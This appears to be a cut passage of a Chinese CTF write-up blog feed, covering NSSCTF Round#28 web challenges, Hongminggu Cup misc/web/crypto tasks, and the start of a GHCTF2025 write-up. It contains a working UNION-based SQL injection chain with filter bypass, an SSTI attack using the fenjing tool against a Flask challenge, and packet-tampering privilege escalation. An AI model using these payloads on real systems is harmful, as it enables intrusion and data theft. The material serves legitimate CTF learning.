/flag&quot;</span></span><br><span class="line">res = requests.post(url, data=data)</span><br><span class="line"><span class="built_in">print</span>(res.text)</span><br></pre></td></tr></table></figure><h3 id="light_pink"><a class="markdownIt-Anchor" href="#light_pink"></a> light_pink</h3><p>试出了，用单引号进行闭合(字符型注入)，<code>order by</code>查询列数，发现数据库错误，那就试着把注释带上(这是个好习惯)，不可以用<code>-</code>，用<code>#</code>也不行，换<code>%23</code></p><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 5%23 查到列数为5</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,database(),<span class="number">5</span><span class="operator">%</span><span class="number">23</span>    联合注入中需要id为不存在的数才能把<span class="keyword">union</span>查询的内容回显，得到nss_board</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3,group_concat(table_name),5 from information_schema.tables where table_schema like &#x27;</span>nss_board<span class="string">&#x27;%23   这里过滤了等号，用like绕过即可，得到Cute,messages</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">id=0&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(column_name),<span class="number">5</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name <span class="keyword">like</span> <span class="string">&#x27;Cute&#x27;</span><span class="operator">%</span><span class="number">23</span>    得到id,Happy，另外一个是id,username,title,content,created_at</span><br><span class="line"></span><br><span class="line">id<span class="operator">=</span><span class="number">0</span><span class="string">&#x27; union select 1,2,3,group_concat(Happy),5 from Cute%23</span></span><br></pre></td></tr></table></figure><p>说实话<code>sqlmap</code>好像梭不出来()，还有人把数据库扫出来了</p><h3 id="coding-loving"><a class="markdownIt-Anchor" href="#coding-loving"></a> Coding Loving</h3><p><strong>Code Audit</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span></span><br><span class="line">FILTER_KEYWORDS = [<span class="string">&#x27;Ciallo～(∠・ω ＜）⌒★&#x27;</span>]</span><br><span class="line">TIME_LIMIT = <span class="number">1</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">contains_forbidden_keywords</span>(<span class="params">complaint</span>):</span><br><span class="line">    <span class="keyword">for</span> keyword <span class="keyword">in</span> FILTER_KEYWORDS:</span><br><span class="line">        <span class="keyword">if</span> keyword.lower() <span class="keyword">in</span> complaint:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;test&#x27;</span></span><br><span class="line">    command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;coding&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, command=command)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/test&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shell</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&#x27;test&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> (abc:=request.headers.get(<span class="string">&#x27;User-Agent&#x27;</span>)) <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;Auth.html&#x27;</span>)</span><br><span class="line">    cmd = request.args.get(<span class="string">&#x27;cmd&#x27;</span>, <span class="string">&#x27;试一试&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        css_url = url_for(<span class="string">&#x27;static&#x27;</span>, filename=<span class="string">&#x27;style.css&#x27;</span>)</span><br><span class="line">        command = request.form.get(<span class="string">&#x27;cmd&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> contains_forbidden_keywords(command):</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;forbidden.html&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(<span class="string">f&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">        &lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;head&gt;</span></span><br><span class="line"><span class="string">            &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;title&gt;Loving Music&lt;/title&gt;</span></span><br><span class="line"><span class="string">            &lt;link rel=&quot;stylesheet&quot; href=&quot;<span class="subst">&#123;css_url&#125;</span>&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;link href=&quot;https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&amp;display=swap&quot; rel=&quot;stylesheet&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;/head&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">            &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">                &lt;h1&gt;Loving coding&lt;/h1&gt;</span></span><br><span class="line"><span class="string">                &lt;p class=&quot;emoji&quot;&gt;🧑‍💻&lt;/p&gt;</span></span><br><span class="line"><span class="string">                &lt;p&gt;<span class="subst">&#123;command&#125;</span>&lt;/p&gt;</span></span><br><span class="line"><span class="string">            &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span>, command=command,css_url=css_url)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;shell.html&#x27;</span>, command=cmd)</span><br></pre></td></tr></table></figure><p>看见了<code>render_template_string</code>，那就打<code>SSTI</code>，说实话折腾了好久焚尽，就是不行，好奇怪</p><p>最后去<code>wsl</code>里面试试，发现成功了。。。。<code>webui</code>和黑名单(这个我没<strong>fuzz</strong>，拿的别人<code>wp</code>的)，都失败了，最后参考<a href="https://www.bx33661.com/archives/nssround-28--webfang-xiang-ti-jie#Coding-Loving">这篇</a>，<code>crack-request</code><br />这是<strong>windows</strong>的，有点逆天<br /><img src="https://picx.zhimg.com/80/v2-20aabab13a61704916d0d120c78745cf_1440w.png" alt="" /><br />这是我<strong>wsl</strong>刚<code>pip install fenjing</code>的<br /><img src="https://picx.zhimg.com/80/v2-f539c7f490a7e25aced89710414b05f1_1440w.png" alt="" /></p><p>自己抓的包</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">POST /test HTTP/<span class="number">1.1</span></span><br><span class="line">Host: node6.anna.nssctf.cn:<span class="number">24482</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">Priority: u=<span class="number">0</span>, i</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Origin: http://node6.anna.nssctf.cn:<span class="number">24482</span></span><br><span class="line">Referer: http://node6.anna.nssctf.cn:<span class="number">24482</span>/</span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Cookie: Hm_lvt_648a44a949074de73151ffaa0a832aec=<span class="number">1733148706</span>,<span class="number">1733212021</span>,<span class="number">1733212157</span>,<span class="number">1733420774</span>; session=eyJ1c2VyIjoidGVzdCJ9.Z-Elfw.u8hpIKgL8gXSzLW0ayQI4Y3KYjw</span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">136.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">136.0</span></span><br><span class="line">Content-<span class="type">Type</span>: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: <span class="number">11</span></span><br><span class="line"></span><br><span class="line">cmd=PAYLOAD</span><br></pre></td></tr></table></figure><p><code>python3 -m fenjing crack-request -f http.txt --host &quot;node6.anna.nssctf.cn&quot; --port 24482</code></p><h1 id="红明谷杯"><a class="markdownIt-Anchor" href="#红明谷杯"></a> 红明谷杯</h1><h2 id="misc"><a class="markdownIt-Anchor" href="#misc"></a> Misc</h2><h3 id="异常行为溯源"><a class="markdownIt-Anchor" href="#异常行为溯源"></a> 异常行为溯源()</h3><p><strong>30万个流量包</strong>，数据解一次<code>base64</code>，还有提取中间的内容再解一次<code>base64</code>才能拿到<code>ip</code>，随便试了几个，不对，<code>python</code>脚本提的数据不太行，是时候补个<strong>流量分析工具</strong>了(bushi)，<code>NetA Pro</code>在整不知道用不用得上，试了一下没用，还是要靠脚本提</p><p>晚上找到了一篇<a href="https://nvme0n1p.dev/post/2025-hmg-wp">wp</a>，其他题目也可以参考</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># from json import load</span></span><br><span class="line"><span class="keyword">from</span> pyshark <span class="keyword">import</span> FileCapture</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\log.log&quot;</span>, <span class="string">&quot;a&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> packet <span class="keyword">in</span> FileCapture(input_file=<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\network_traffic.pcap&quot;</span>, keep_packets=<span class="literal">False</span>):</span><br><span class="line">        tcp = packet.tcp</span><br><span class="line">        data = <span class="built_in">bytes</span>.fromhex(tcp.payload.replace(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;&quot;</span>)).decode()</span><br><span class="line">        data = b64decode(data).decode()</span><br><span class="line">        data = loads(data)</span><br><span class="line">        msg = data[<span class="string">&quot;msg&quot;</span>]</span><br><span class="line">        <span class="built_in">type</span> = data[<span class="string">&quot;type&quot;</span>]</span><br><span class="line">        msg = b64decode(msg).decode().strip()</span><br><span class="line">        f.write(msg+<span class="string">&quot;\n&quot;</span>)</span><br></pre></td></tr></table></figure><p>好好好，原来脚本要这样写，载入流量包这一块就没经验了，如果<code>wireshark</code>安装不是默认路径，得<a href="https://blog.csdn.net/qq_42411587/article/details/119909870">参考修改</a></p><p>然后就是<strong>正则匹配</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line">logs = <span class="built_in">open</span>(<span class="string">&quot;C:\\Users\\27920\\Desktop\\hmg2025\\log.log&quot;</span>).readlines()</span><br><span class="line">log_match = re.<span class="built_in">compile</span>(</span><br><span class="line">    <span class="string">r&#x27;(\d+\.\d+\.\d+\.\d+) ?- - \[(.*) \+\d+\] &quot;(\w+) ([\w\/.-]+) HTTP\/1\.1&quot; \d+ \d+ &quot;-&quot; &quot;.*&quot;&#x27;</span>)</span><br><span class="line">ip_maps = &#123;&#125;</span><br><span class="line"><span class="keyword">for</span> log <span class="keyword">in</span> logs:</span><br><span class="line">    m = log_match.<span class="keyword">match</span>(log)</span><br><span class="line">    ip = m.group(<span class="number">1</span>)</span><br><span class="line">    time = m.group(<span class="number">2</span>)</span><br><span class="line">    time = datetime.strptime(time, <span class="string">&quot;%d/%b/%Y:%H:%M:%S&quot;</span>)</span><br><span class="line">    method = m.group(<span class="number">3</span>)</span><br><span class="line">    url = m.group(<span class="number">4</span>)</span><br><span class="line">    <span class="comment"># print(time_match.match(time).group())</span></span><br><span class="line">    ip_maps[ip] = ip_maps.get(ip, <span class="number">0</span>) + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># print()</span></span><br><span class="line">ip_maps = <span class="built_in">sorted</span>(ip_maps.items(), key=<span class="keyword">lambda</span> x: x[<span class="number">1</span>], reverse=<span class="literal">True</span>)</span><br><span class="line"><span class="keyword">for</span> ip, count <span class="keyword">in</span> ip_maps:</span><br><span class="line">    <span class="built_in">print</span>(ip, count)</span><br><span class="line">    <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="web-2"><a class="markdownIt-Anchor" href="#web-2"></a> web</h2><h3 id="简单的仓库"><a class="markdownIt-Anchor" href="#简单的仓库"></a> 简单的仓库</h3><p>先注册，然后抓包充值接口<br /><img src="https://picx.zhimg.com/80/v2-468ee1cb3d384d48548f50216a923796_1440w.png" alt="" /><br />发现应该是目录读取，<code>hvang/readme.txt</code>这样，直接读根目录<br /><img src="https://picx.zhimg.com/80/v2-6ef314597817ff95786d6b131f99d298_1440w.png" alt="" /><br />想办法读文件，这时候发现我们还是<code>guest</code>，继续抓包改一下权限<br /><img src="https://picx.zhimg.com/80/v2-2b615198930c6101c1a05e19cc02c8a5_1440w.png" alt="" /><br />之后可以下载文件，找到下载路径，查看<code>/flag.sh</code>，找到<code>flag</code>文件位置<br /><img src="https://picx.zhimg.com/80/v2-15f2a2c40b856b1ff65df32a149d5971_1440w.png" alt="" /><br /><img src="https://picx.zhimg.com/80/v2-34fd1872100e1ae0a093d60d07a94dd9_1440w.png" alt="" /></p><p>你这仓库<code>user</code>目录居然可以这样控制的，六百六十六啊</p><h3 id="日记本"><a class="markdownIt-Anchor" href="#日记本"></a> 日记本()</h3><p>还没来得及看，今天怎么一堆比赛啊QWQ，后面再找个<code>wp</code>补补</p><p>好吧，看了一下，不怎么好打</p><h2 id="cryptounsolved"><a class="markdownIt-Anchor" href="#cryptounsolved"></a> Crypto(unsolved)</h2><h3 id="qaq"><a class="markdownIt-Anchor" href="#qaq"></a> qaq</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> pad</span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">mul</span>(<span class="params">numbers</span>):</span><br><span class="line">    <span class="keyword">return</span> reduce(<span class="keyword">lambda</span> x, y: x * y, numbers)</span><br><span class="line"></span><br><span class="line">res = [<span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272555731</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556223</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556437</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272556749</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557237</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557459</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272557687</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272558627</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559239</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559523</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272559787</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560169</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560343</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560433</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560751</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272560969</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272561441</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562103</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272562601</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563261</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563297</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563391</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563511</span>, <span class="number">4002409555221667393417789825735904156556882819939007885332058136124031650490837864442687629129015664037894272563711</span>]</span><br><span class="line">p = res[<span class="number">11</span>]</span><br><span class="line">pp = mul(res)</span><br><span class="line">K = GF(p)</span><br><span class="line">E = EllipticCurve(K, (<span class="number">0</span>, <span class="number">4</span>))</span><br><span class="line">qwq = <span class="number">0x320238b</span></span><br><span class="line">qaq = E.order()//qwq**<span class="number">2</span></span><br><span class="line"></span><br><span class="line">flag = pad(<span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>, <span class="string">&quot;rb&quot;</span>).read().strip(),<span class="number">4</span>)</span><br><span class="line">flag_part = [bytes_to_long(flag[i:i+<span class="number">2</span>]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(flag), <span class="number">2</span>)]</span><br><span class="line"></span><br><span class="line">output = []</span><br><span class="line"><span class="keyword">for</span> c <span class="keyword">in</span> flag_part:</span><br><span class="line">    P1 = qaq*E.random_element()</span><br><span class="line">    P2 = qaq*E.random_element()</span><br><span class="line">    out = P1.weil_pairing(P2, qwq)**<span class="number">3</span>*c</span><br><span class="line">    output.append(<span class="built_in">pow</span>(out,qaq, pp))</span><br><span class="line"><span class="built_in">print</span>(output)</span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">[2258729984869869545899085887518820011795880892632317458813070773270633871398785757696896679887453336507722151037267, 1843407310728065127389586068976768146728145160643439144895915852634291722663455873979176336542780552480617232750208, 1107061034832953338095294459542523703297843192927313275050958753437078121375795698115353665062727895555487155331316, 460337686287218470707660572908024613140030922587867288532588857547792028112129697850035268228038619747643899804437, 1659483062154723617504533638726171721668768657049197025961515070605996080663312140357834824850074607457421362000265, 3150528329201636320206556304125544975332446992414777732425647667048147102509308959254762895094589762017857965981432, 3338854035461286314545186888372727000962778038359519702308782495912356677650264814573463929190025956045491115654437, 3042574495339632074308497406446851120362994432361876743901608172567070991832258762751304397604780567703759317642849, 380771388315580393673388198522357440257018642337119013880143084485482127962577943753495690258532782147018511750175, 507222017133457507399048159541059729302482262298099528096040456818913085187752925782279385808732260473494863290057, 533663958640518878580794848474449572155795564171089765377581587253792204491009275840408579120376539757958097910250, 2681145160205204287930367627648683111546318004811732016137828270063753300095675791698398080219566725174890793619305, 3259478178021541801713314504097142165241891541242669456591074651894459393333167453811425864198267757724232689747676, 3553147298452254907907643059383506744982654808021508866104139240155822133286673657139615950259800036058045049186173, 1778776925369812510137824472396145391840300438509021838870105004154301861222612045533034046889878767915343446874895, 3409071358092535255033136229525415652816479844958949032220987821989305575696869929136493897719813036034016228268240, 571819148781137687997336847709735468532344087614483867682513640750800758034003212746545051127998686475933050072942, 2676666310158795770609746651024766841212271213339384335651155407291004834251914242990757216402110096603729617413168, 2557670339976470006330058052583841683167706755578266425502679937976714609864257535859316483527764340425703004883241, 973319024062640263364951783086923560907216776835485042157036675663719529568519121997200478026304141184810597275543, 1189768012357955450386827626693191057999220508190415783719135619271537446794904663649700073564180453068646130539863, 790522915783756530835443034667719516913120763875831140857606265058871034793645280121113275798239222760522467771184]</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br></pre></td></tr></table></figure><p>好吧，在<code>MOV</code>攻击中看到过这个，<strong>Weil Pairing</strong>，没啥思路，不了解这东西<br />有空跟<code>wp</code>认真学一下</p><h3 id="ecbag"><a class="markdownIt-Anchor" href="#ecbag"></a> ECBag</h3><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint, choice</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">160</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p =&quot;</span>, p)</span><br><span class="line">a, b = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;a =&quot;</span>)), <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;b =&quot;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(<span class="built_in">set</span>([a%p, b%p, (a+b)%p, (a-b)%p])) == <span class="number">4</span></span><br><span class="line">E1 = EllipticCurve(Zmod(p), [a, b])</span><br><span class="line">E2 = EllipticCurve(Zmod(p), [a+b, a-b])</span><br><span class="line">P, Q = E1.gens()[<span class="number">0</span>], E2.gens()[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">n = <span class="number">80</span></span><br><span class="line">s = [choice([<span class="number">0</span>, bytes_to_long(flag)]) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">sP, sQ = [_*P <span class="keyword">for</span> _ <span class="keyword">in</span> s], [_*Q <span class="keyword">for</span> _ <span class="keyword">in</span> s]</span><br><span class="line">AP, AQ = [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)], [randint(<span class="number">0</span>, p) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]</span><br><span class="line">encP, encQ = <span class="built_in">sum</span>([AP[_]*sP[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)]), <span class="built_in">sum</span>([AQ[_]*sQ[_] <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(n)])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;A =&quot;</span>, [AP, AQ])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;enc =&quot;</span>, [P.xy(), Q.xy(), encP.xy(), encQ.xy()])</span><br></pre></td></tr></table></figure><h3 id="else"><a class="markdownIt-Anchor" href="#else"></a> else</h3><p><a href="https://blog.weyung.cc/2025/03/22/2025%20%E7%BA%A2%E6%98%8E%E8%B0%B7%E6%9D%AF%20-%20Crypto/">未央师傅的wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;nssctf-round28&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#nssctf-round28&quot;&gt;&lt;/a&gt; NSSCTF Round#28&lt;/h1&gt;
&lt;h2 id=&quot;web&quot;&gt;&lt;a class=&quot;markdownIt-Anch</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>GHCTF2025-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/10/GHCTF2025-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/10/GHCTF2025-WriteUp/</id>
    <published>2025-03-09T18:00:00.000Z</published>
    <updated>2025-04-02T17:01:14.032Z</updated>
    
    <content type="html"><![CDATA[<p>诶，这里有老登偷偷炸鱼(bushi</p><h1 id="crypto"><a class="markdownIt-Anchor" href="#crypto"></a> Crypto</h1><p>无意中发现了一个<strong>在线Sagemath运行平台</strong>，<strong>10.4版本的</strong>，有需要可以使用(<br /><a href="https://cocalc.com/features/sage">https://cocalc.com/features/sage</a></p><p>下面是我自己比赛的时候自己做的(密码是<code>river</code>没做，<code>web</code>做了前几题，赛后继续做)，然后再加上一点赛后学习别的师傅的<code>wp</code>整合起来的</p><h2 id="baby_factor"><a class="markdownIt-Anchor" href="#baby_factor"></a> baby_factor</h2><p>基础的<code>RSA</code>，过于简单，不写了</p><h2 id="baby_signin"><a class="markdownIt-Anchor" href="#baby_signin"></a> baby_signin</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> getPrime, bytes_to_long</span><br><span class="line">p=getPrime(<span class="number">128</span>)</span><br><span class="line">q=getPrime(<span class="number">128</span>)</span><br><span class="line">n=p*q</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">flag=<span class="string">&quot;NSSCTF&#123;xxxxxx&#125;&quot;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;p=&quot;</span>,p)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;q=&quot;</span>,q)</span><br><span class="line">m=bytes_to_long(flag.encode())</span><br><span class="line">e=<span class="number">4</span></span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">p= 182756071972245688517047475576147877841</span></span><br><span class="line"><span class="string">q= 305364532854935080710443995362714630091</span></span><br><span class="line"><span class="string">c= 14745090428909283741632702934793176175157287000845660394920203837824364163635</span></span><br><span class="line"><span class="string">n= 55807222544207698804941555841826949089076269327839468775219849408812970713531</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mo>=</mo><mn>4</mn><mtext>与</mtext><mi>ϕ</mi><mtext>不互素，经典</mtext><mi>A</mi><mi>M</mi><mi>M</mi><mtext>，还是一样，懒人直接上师兄的科技</mtext></mrow><annotation encoding="application/x-tex">e=4与\phi 不互素，经典AMM，还是一样，懒人直接上师兄的科技</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">e</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord">4</span><span class="mord cjk_fallback">与</span><span class="mord mathnormal">ϕ</span><span class="mord cjk_fallback">不</span><span class="mord cjk_fallback">互</span><span class="mord cjk_fallback">素</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">经</span><span class="mord cjk_fallback">典</span><span class="mord mathnormal">A</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">还</span><span class="mord cjk_fallback">是</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">样</span><span class="mord cjk_fallback">，</span><span class="mord cjk_fallback">懒</span><span class="mord cjk_fallback">人</span><span class="mord cjk_fallback">直</span><span class="mord cjk_fallback">接</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">师</span><span class="mord cjk_fallback">兄</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">科</span><span class="mord cjk_fallback">技</span></span></span></span></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment"># sage</span></span><br><span class="line"><span class="keyword">from</span> sage.<span class="built_in">all</span> <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> sage.parallel.multiprocessing_sage <span class="keyword">import</span> parallel_iter    <span class="comment"># TODO</span></span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdm</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">nth_p</span>(<span class="params">y, n, p, k=<span class="number">1</span></span>):</span><br><span class="line">  <span class="keyword">assert</span> is_pseudoprime(p)</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&#x27;[LOG] Solving pi = %s^%d&#x27;</span> % (<span class="built_in">hex</span>(p), k))</span><br><span class="line">  <span 